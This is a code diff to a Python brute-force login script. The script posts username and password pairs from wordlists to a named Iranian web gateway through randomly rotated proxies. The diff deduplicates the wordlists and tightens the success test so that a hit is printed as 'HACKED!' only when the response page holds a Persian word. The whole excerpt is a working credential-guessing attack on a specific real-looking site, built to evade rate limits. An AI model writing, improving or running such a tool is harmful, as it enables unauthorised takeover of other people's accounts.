@@ -6,8 +6,8 @@ from proxy_list import ProxyList
 
 # Read Files
 
-usernames_file = [every_line.strip('\n') for every_line in open('Usernames.txt', 'r')]
-passwords_file = [every_line.strip('\n') for every_line in open('Passwords.txt', 'r')]
+usernames_file = list(set([every_line.strip('\n') for every_line in open('Usernames.txt', 'r')]))
+passwords_file = list(set([every_line.strip('\n') for every_line in open('Passwords.txt', 'r')]))
 
 
 # Convert Passwords to MD5
@@ -29,16 +29,16 @@ def correspond_data(username, password):
         try:
             request = requests.post('http://puya.ubahar.ir/gateway/UserInterim.php', data=data, proxies=proxy_list.get_random_proxy())
 
-            if request.status_code == 200:
-                print(username + ' - ' + password + ' - HACKED!')
+            if request.status_code == 200 and 'راهنما' in request.text:
+                print('True: ' + username + ' - ' + password + ' ━━━━━━━━━━ HACKED!')
             else:
-                print('HTTP Code Error : ' + username + ' - ' + password)
+                print('False: ' + username + ' - ' + password)
 
             return False
 
 
         except:
-            print('Proxy Error : ' + username + ' - ' + password)
+            print('Proxy Error: ' + username + ' - ' + password)
 
 
 # Run Requests
